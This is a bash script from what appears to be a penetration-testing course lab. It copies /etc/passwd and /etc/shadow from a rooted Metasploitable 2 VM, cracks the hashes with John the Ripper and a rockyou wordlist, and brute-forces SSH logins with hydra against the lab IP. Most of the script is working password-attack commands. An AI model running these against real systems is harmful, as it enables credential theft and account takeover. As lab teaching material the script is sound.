#!/usr/bin/env bash
# Week 7 Part 0b — password cracking command script (free tools only).
# PRIMARY: run against the LIVE target (Metasploitable 2 at 192.168.1.200) after you
# already have root from the Week 5 exploitation. FALLBACK sample-* files are for when
# the VM is down — they are illustrative only, not a substitute for the live host.

set -u
TARGET=192.168.1.200

### ---- OFFLINE cracking (John the Ripper) ----
# On the LIVE target (you have a root shell):
#   cp /etc/passwd /root/acme-passwd.txt
#   cp /etc/shadow /root/acme-shadow.txt
# Then copy both back to Kali. FALLBACK: use the sample-* files shipped here.

PASSWD=${1:-sample-passwd.txt}     # /etc/passwd copy  (no hashes, just accounts)
SHADOW=${2:-sample-shadow.txt}     # /etc/shadow copy  (the md5crypt $1$ hashes)
WORDLIST=${WORDLIST:-/usr/share/wordlists/rockyou.txt}

# unshadow merges passwd + shadow into the single format John expects
unshadow "$PASSWD" "$SHADOW" > acme-hashes.txt

# crack with a dictionary (rockyou). Add rules with: --rules=Jumbo
john --wordlist="$WORDLIST" acme-hashes.txt

# reprint everything already cracked (from john's pot file), no re-cracking
john --show acme-hashes.txt

### ---- ONLINE cracking (hydra) — RoE: only the in-scope lab host ----
# -l <login>  single username   | -P <file> password list | ssh://host the service
# Louder than offline: every guess is a real SSH login attempt. Mind lockouts.
hydra -l msfadmin -P pw-small.txt "ssh://${TARGET}"
